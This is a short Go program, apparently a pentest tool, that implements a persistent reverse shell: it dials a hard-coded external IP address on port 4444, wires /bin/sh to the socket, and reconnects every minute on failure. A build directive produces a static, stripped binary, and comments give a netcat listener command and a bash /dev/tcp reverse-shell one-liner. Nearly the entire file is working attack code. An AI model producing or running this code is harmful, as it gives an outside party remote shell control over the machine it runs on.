
//go:generate sh -c "CGO_ENABLED=0 go build -installsuffix netgo -tags netgo -ldflags \"-s -w -extldflags '-static'\" -o $DOLLAR(basename ${GOFILE} .go)`go env GOEXE` ${GOFILE}"
// +build !windows

// Reverse Shell in Go
// http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
// Test with nc -lvvp 6666
package main

import (
	"net"
	"os/exec"
	"time"
)

func main() {
	reverse("35.188.127.192:4444")
}

// bash -i >& /dev/tcp/localhost/6666 0>&1
func reverse(host string) {
	c, err := net.Dial("tcp", host)
	if nil != err {
		if nil != c {
			c.Close()
		}
		time.Sleep(time.Minute)
		reverse(host)
	}

	cmd := exec.Command("/bin/sh")
	cmd.Stdin, cmd.Stdout, cmd.Stderr = c, c, c
	cmd.Run()
	c.Close()
	reverse(host)
}
